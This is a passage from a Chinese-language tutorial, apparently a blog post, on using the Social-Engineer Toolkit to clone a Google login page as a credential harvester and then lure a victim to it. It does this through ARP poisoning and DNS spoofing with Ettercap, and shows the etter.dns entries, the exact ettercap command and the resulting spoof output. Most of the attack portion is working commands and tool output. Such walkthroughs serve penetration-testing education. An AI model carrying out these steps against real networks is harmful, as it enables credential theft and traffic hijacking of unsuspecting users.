class="line">[-] New set.config.py file generated on: 2020-12-28 06:50:39.218765</span><br><span class="line">[-] Verifying configuration update...</span><br><span class="line">[*] Update verified, config timestamp is: 2020-12-28 06:50:39.218765</span><br><span class="line">[*] SET is using the new config, no need to restart</span><br><span class="line">Copyright 2020, The Social-Engineer Toolkit (SET) by TrustedSec, LLC</span><br><span class="line">All rights reserved.</span><br><span class="line"></span><br><span class="line">Redistribution and use <span class="keyword">in</span> <span class="built_in">source</span> and binary forms, with or without modification, are permitted provided that the following conditions are met:</span><br><span class="line"></span><br><span class="line">    * Redistributions of <span class="built_in">source</span> code must retain the above copyright notice, this list of conditions and the following disclaimer.</span><br><span class="line">    * Redistributions <span class="keyword">in</span> binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer <span class="keyword">in</span> the documentation and/or other materials provided with the distribution.</span><br><span class="line">    * Neither the name of Social-Engineer Toolkit nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.</span><br><span class="line"></span><br><span class="line">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS <span class="string">"AS IS"</span> AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDINGNEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span><br><span class="line"></span><br><span class="line">The above licensing was taken from the BSD licensing and is applied to Social-Engineer Toolkit as well.</span><br><span class="line"></span><br><span class="line">Note that the Social-Engineer Toolkit is provided as is, and is a royalty free open-source application.</span><br><span class="line"></span><br><span class="line">Feel free to modify, use, change, market, <span class="keyword">do</span> whatever you want with it as long as you give the appropriate credit <span class="built_in">where</span> credit is due (<span class="built_in">which</span> means giving the authors the credit they deserve <span class="keyword">for</span> writing it).</span><br><span class="line"></span><br><span class="line">Also note that by using this software, <span class="keyword">if</span> you ever see the creator of SET <span class="keyword">in</span> a bar, you should (optional) give him a hug and should (optional) buy him a beer (or bourbon - hopefully bourbon). Author has the option to refuse the hug (most likely will never happen) or the beer or bourbon (also most likely will never happen). Also by using this tool (these are all optional of course!), you should try to make this industry better, try to stay positive, try to <span class="built_in">help</span> others, try to learn from one another, try stay out of drama, try offer free hugs when possible (and make sure recipient agrees to mutual hug), and try to <span class="keyword">do</span> everything you can to be awesome.</span><br><span class="line">The Social-Engineer Toolkit is designed purely <span class="keyword">for</span> good and not evil. If you are planning on using this tool <span class="keyword">for</span> malicious purposes that are not authorized by the company you are performing assessments <span class="keyword">for</span>, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool <span class="keyword">for</span> lawful purposes only.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Do you agree to the terms of service [y/n]:</span><br></pre></td></tr></table></figure><p>输出的信息详细地介绍了SET。该信息在第一次运行时才会显示。在该界面接受这部分信息后，才可进行其他操作。此时输入y，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">           ,..-,</span><br><span class="line">         ,;;f^^<span class="string">""</span><span class="string">"-._</span></span><br><span class="line"><span class="string">        ;;'          `-.</span></span><br><span class="line"><span class="string">       ;/               `.</span></span><br><span class="line"><span class="string">       ||  _______________\_______________________</span></span><br><span class="line"><span class="string">       ||  |HHHHHHHHHHPo"</span>~~\"o?HHHHHHHHHHHHHHHHHHH|</span><br><span class="line">       ||  |HHHHHHHHHP-._   \,<span class="string">'?HHHHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'</span>|HHHHH|</span><br><span class="line">        `| |HHHHHb.?Hb    .--J-dHP,dHHPo<span class="string">'_.rdHHHHH|</span></span><br><span class="line"><span class="string">         \ |HHHi.`;;.H`-./__/-'</span>H_,--<span class="string">'/;rdHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHboo.\ `|"\"/"\" '</span>/\ .<span class="string">'dHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|</span></span><br><span class="line"><span class="string">           |""""""""""""""""""""""""""""""""""""""|</span></span><br><span class="line"><span class="string">           |,;=====.     ,-.  =.       ,=,,=====. |</span></span><br><span class="line"><span class="string">           |||     '</span>    //<span class="string">"\\   \\   //  ||     ' |</span></span><br><span class="line"><span class="string">           |||         ,/' `\.  `\. ,/'  ``=====. |</span></span><br><span class="line"><span class="string">           |||     .   //"</span><span class="string">""</span>\\   \\_//    .     |||</span><br><span class="line">           |`;=====<span class="string">' ='</span><span class="string">'     ``=  `-'</span>     `=====<span class="string">''</span>|</span><br><span class="line">           |______________________________________|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: 8.0.3</span><br><span class="line">                    Codename: <span class="string">'Maverick'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https://www.trustedsec.com       [---]</span><br><span class="line">        Welcome to the Social-Engineer Toolkit (SET).</span><br><span class="line">         The one stop shop <span class="keyword">for</span> all of your SE needs.</span><br><span class="line"></span><br><span class="line">   The Social-Engineer Toolkit is a product of TrustedSec.</span><br><span class="line"></span><br><span class="line">           Visit: https://www.trustedsec.com</span><br><span class="line"></span><br><span class="line">   It<span class="string">'s easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="string">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   1) Social-Engineering Attacks</span></span><br><span class="line"><span class="string">   2) Penetration Testing (Fast-Track)</span></span><br><span class="line"><span class="string">   3) Third Party Modules</span></span><br><span class="line"><span class="string">   4) Update the Social-Engineer Toolkit</span></span><br><span class="line"><span class="string">   5) Update SET configuration</span></span><br><span class="line"><span class="string">   6) Help, Credits, and About</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  99) Exit the Social-Engineer Toolkit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>以上显示了社会工程学工具包的创建者、版本为8.0.3、代号为Maverick及菜单信息。此时可以根据自己的需要，选择相应的编号进行操作。例如，选择社会工程学攻击。输入编号1，将显示可实施的社会工程学攻击列表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">                          _                                           J</span><br><span class="line">                         /-\                                          J</span><br><span class="line">                    _____|<span class="comment">#|_____                                     J</span></span><br><span class="line">                   |_____________|                                    J</span><br><span class="line">                  |_______________|                                   E</span><br><span class="line">                 ||_POLICE_<span class="comment">##_BOX_||                                  R</span></span><br><span class="line">                 | |-|-|-|||-|-|-| |                                  O</span><br><span class="line">                 | |-|-|-|||-|-|-| |                                  N</span><br><span class="line">                 | |_|_|_|||_|_|_| |                                  I</span><br><span class="line">                 | ||~~~| | |---|| |                                  M</span><br><span class="line">                 | ||~~~|!|!| O || |                                  O</span><br><span class="line">                 | ||~~~| |.|___|| |                                  O</span><br><span class="line">                 | ||---| | |---|| |                                  O</span><br><span class="line">                 | ||   | | |   || |                                  O</span><br><span class="line">                 | ||___| | |___|| |                                  !</span><br><span class="line">                 | ||---| | |---|| |                                  !</span><br><span class="line">                 | ||   | | |   || |                                  !</span><br><span class="line">                 | ||___| | |___|| |                                  !</span><br><span class="line">                 |-----------------|                                  !</span><br><span class="line">                 |   Timey Wimey   |                                  !</span><br><span class="line">                 -------------------                                  !</span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: 8.0.3</span><br><span class="line">                    Codename: <span class="string">'Maverick'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https://www.trustedsec.com       [---]</span><br><span class="line">        Welcome to the Social-Engineer Toolkit (SET).</span><br><span class="line">         The one stop shop <span class="keyword">for</span> all of your SE needs.</span><br><span class="line"></span><br><span class="line">   The Social-Engineer Toolkit is a product of TrustedSec.</span><br><span class="line"></span><br><span class="line">           Visit: https://www.trustedsec.com</span><br><span class="line"></span><br><span class="line">   It<span class="string">'s easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="string">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">During handling of the above exception, another exception occurred:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   1) Spear-Phishing Attack Vectors</span></span><br><span class="line"><span class="string">   2) Website Attack Vectors</span></span><br><span class="line"><span class="string">   3) Infectious Media Generator</span></span><br><span class="line"><span class="string">   4) Create a Payload and Listener</span></span><br><span class="line"><span class="string">   5) Mass Mailer Attack</span></span><br><span class="line"><span class="string">   6) Arduino-Based Attack Vector</span></span><br><span class="line"><span class="string">   7) Wireless Access Point Attack Vector</span></span><br><span class="line"><span class="string">   8) QRCode Generator Attack Vector</span></span><br><span class="line"><span class="string">   9) Powershell Attack Vectors</span></span><br><span class="line"><span class="string">  10) Third Party Modules</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  99) Return back to the main menu.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>以上信息显示了社会工程学攻击的菜单选项。此时，用户就可以选择工程学攻击的类型，然后实施攻击。</p><h3 id="2-2-Web攻击向量"><a href="#2-2-Web攻击向量" class="headerlink" title="2.2 Web攻击向量"></a>2.2 Web攻击向量</h3><p>Web攻击向量会特意构造出一些对目标而言是可信且具有诱惑力的网页。当目标用户访问该网页后，即可窃取目标用户的信息。社会工程学攻击工具包可以克隆出和实际运行的可信站点外观完全一样的网页，这使得受害者认为他们正在浏览一个合法站点。</p><p>使用SET实施Web攻击向量。具体操作步骤如下：</p><ol><li><p>启动社会工程学工具包，并选择社会工程学攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setoolkit</span></span><br><span class="line"></span><br><span class="line">……………………</span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   2) Penetration Testing (Fast-Track)</span><br><span class="line">   3) Third Party Modules</span><br><span class="line">   4) Update the Social-Engineer Toolkit</span><br><span class="line">   5) Update SET configuration</span><br><span class="line">   6) Help, Credits, and About</span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">…………………………</span><br><span class="line">   1) Spear-Phishing Attack Vectors</span><br><span class="line">   2) Website Attack Vectors</span><br><span class="line">   3) Infectious Media Generator</span><br><span class="line">   4) Create a Payload and Listener</span><br><span class="line">   5) Mass Mailer Attack</span><br><span class="line">   6) Arduino-Based Attack Vector</span><br><span class="line">   7) Wireless Access Point Attack Vector</span><br><span class="line">   8) QRCode Generator Attack Vector</span><br><span class="line">   9) Powershell Attack Vectors</span><br><span class="line">  10) Third Party Modules</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure><p>以上信息显示了攻击社会工程学的菜单选项。此时，用户可以选择对应的攻击类型，然后实施攻击。</p></li><li><p>选择Web攻击向量，所以输入编号为2，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 2</span><br><span class="line"></span><br><span class="line">The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframereplacements to make the highlighted URL link to appear legitimate however when clicked a windowpops up <span class="keyword">then</span> is replaced with the malicious link. You can edit the link replacement settings <span class="keyword">in</span> the set_config <span class="keyword">if</span> its too slow/fast.</span><br><span class="line"></span><br><span class="line">The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see <span class="built_in">which</span> is successful.</span><br><span class="line"></span><br><span class="line">The HTA Attack method will allow you to <span class="built_in">clone</span> a site and perform powershell injection through HTA files <span class="built_in">which</span> can be used <span class="keyword">for</span> Windows-based powershell exploitation through the browser.</span><br><span class="line"></span><br><span class="line">   1) Java Applet Attack Method</span><br><span class="line">   2) Metasploit Browser Exploit Method</span><br><span class="line">   3) Credential Harvester Attack Method</span><br><span class="line">   4) Tabnabbing Attack Method</span><br><span class="line">   5) Web Jacking Attack Method</span><br><span class="line">   6) Multi-Attack Web Method</span><br><span class="line">   7) HTA Attack Method</span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure><p>以上菜单栏中显示了可实施的Web攻击向量方法，并且详细描述了各种攻击方法的作用。</p></li><li><p>选择证书获取攻击方法，所以输入编号3，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt;3</span><br><span class="line"></span><br><span class="line"> The first method will allow SET to import a list of pre-defined web</span><br><span class="line"> applications that it can utilize within the attack.</span><br><span class="line"></span><br><span class="line"> The second method will completely <span class="built_in">clone</span> a website of your choosing</span><br><span class="line"> and allow you to utilize the attack vectors within the completely</span><br><span class="line"> same web application you were attempting to <span class="built_in">clone</span>.</span><br><span class="line"></span><br><span class="line"> The third method allows you to import your own website, note that you</span><br><span class="line"> should only have an index.html when using the import website</span><br><span class="line"> functionality.</span><br><span class="line"></span><br><span class="line">   1) Web Templates</span><br><span class="line">   2) Site Cloner</span><br><span class="line">   3) Custom Import</span><br><span class="line"></span><br><span class="line">  99) Return to Webattack Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure><p>以上输出信息中，显示了创建Web站点的方式。</p></li><li><p>用户可以根据自己的需要，选择不同的方式。这里为了方便，选择使用SET提供的Web模板。所以，输入编号1，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt;1</span><br><span class="line">[-] Credential harvester will allow you to utilize the <span class="built_in">clone</span> capabilities within SET</span><br><span class="line">[-] to harvest credentials or parameters from a website as well as place them into a report</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---</span><br><span class="line"></span><br><span class="line">The way that this works is by cloning a site and looking <span class="keyword">for</span> form fields to</span><br><span class="line">rewrite. If the POST fields are not usual methods <span class="keyword">for</span> posting forms this</span><br><span class="line">could fail. If it does, you can always save the HTML, rewrite the forms to</span><br><span class="line">be standard forms and use the <span class="string">"IMPORT"</span> feature. Additionally, really</span><br><span class="line">important:</span><br><span class="line"></span><br><span class="line">If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL</span><br><span class="line">IP address below, not your NAT address. Additionally, <span class="keyword">if</span> you don<span class="string">'t know</span></span><br><span class="line"><span class="string">basic networking concepts, and you have a private IP address, you will</span></span><br><span class="line"><span class="string">need to do port forwarding to your NAT IP address from your external IP</span></span><br><span class="line"><span class="string">address. A browser doesns'</span>t know how to communicate with a private IP</span><br><span class="line">address, so <span class="keyword">if</span> you don<span class="string">'t specify an external IP address if you are using</span></span><br><span class="line"><span class="string">this from an external perpective, it will not work. This isn'</span>t a SET issue</span><br><span class="line">this is how networking works.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt; IP address <span class="keyword">for</span> the POST back <span class="keyword">in</span> Harvester/Tabnabbing [192.168.100.186]:</span><br></pre></td></tr></table></figure><p>此时，指定获取目标用户提交信息的IP地址，即攻击主机Kali的地址。输入以上地址后，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------</span><br><span class="line">             **** Important Information ****</span><br><span class="line"></span><br><span class="line">For templates, when a POST is initiated to harvest</span><br><span class="line">credentials, you will need a site <span class="keyword">for</span> it to redirect.</span><br><span class="line"></span><br><span class="line">You can configure this option under:</span><br><span class="line"></span><br><span class="line">      /etc/setoolkit/set.config</span><br><span class="line"></span><br><span class="line">Edit this file, and change HARVESTER_REDIRECT and</span><br><span class="line">HARVESTER_URL to the sites you want to redirect to</span><br><span class="line">after it is posted. If you <span class="keyword">do</span> not <span class="built_in">set</span> these, <span class="keyword">then</span></span><br><span class="line">it will not redirect properly. This only goes <span class="keyword">for</span></span><br><span class="line">templates.</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  1. Java Required</span><br><span class="line">  2. Google</span><br><span class="line">  3. Twitter</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt; Select a template:</span><br></pre></td></tr></table></figure><p>以上输出信息显示了SET默认提供的几个模板，包括Java Required、Google和Twitter。</p></li><li><p>这里选择Google站点模板，所以输入编号2，将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:webattack&gt; Select a template:2</span><br><span class="line"></span><br><span class="line">[*] Cloning the website: http://www.google.com    <span class="comment">#克隆的站点</span></span><br><span class="line">[*] This could take a little bit...</span><br><span class="line"></span><br><span class="line">The best way to use this attack is <span class="keyword">if</span> username and password form fields are available. Regardless, this captures all POSTs on a website.</span><br><span class="line">[*] The Social-Engineer Toolkit Credential Harvester Attack</span><br><span class="line">[*] Credential Harvester is running on port 80</span><br><span class="line">[*] Information will be displayed to you as it arrives below:</span><br></pre></td></tr></table></figure><p>从以上输出的信息中可以看到，这里克隆的站点为 <a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a> 。接下来，攻击者还需要将目标用户诱骗到克隆的站点上。这样，当客户端登录克隆的网站时，提交的用户名和密码将被捕获。</p><p><code>当用户启动社会工程学攻击后，证书获取默认监听80端口。如果当前系统中运行了80端口的程序（如Apache），将会提示关闭该程序。</code></p><p>现在我们通过使用SET工具包，成功克隆了一个伪站点。此时，用户同样可以使用中间人攻击的方式，将目标用户诱骗到克隆的站点上。由于Web页面是通过DNS解析的，所以用户需要实施DNS欺骗。在Ettercap工具中，提供了一个dns_spoof插件，可以用来实施DNS欺骗。下面将介绍如何使用Ettercap工具实施ARP攻击和DNS欺骗，以将目标用户诱骗到伪站点页面。具体操作步骤如下：</p></li><li><p>修改Ettercap的DNS配置文件，指定欺骗的域名。其中，Ettercap的DNS配置文件为/etc/ettercap/etter.dns，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.google.com A 192.168.100.186 3600</span><br><span class="line">*.*.*          A 192.168.100.186</span><br></pre></td></tr></table></figure><p>这里用户需要根据主机的环境进行配置。其中，本例中攻击主机的地址为192.168.100.186。</p></li><li><p>使用Ettercap发起ARP攻击，并启动dns_spoof插件，即可实施DNS欺骗。执行命令如下：</p><p>命令格式：</p><blockquote><p>ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /要欺骗的ip// /网关的ip//</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">  192.168.100.186/255.255.255.0</span><br><span class="line">  fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">3 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Activating dns_spoof plugin...</span><br><span class="line"></span><br><span class="line">dns_spoof: A [imap.163.com] spoofed to [192.168.100.186] TTL [3600 s]</span><br><span class="line">dns_spoof: A [www.baidu.com] spoofed to [192.168.100.186] TTL [3600 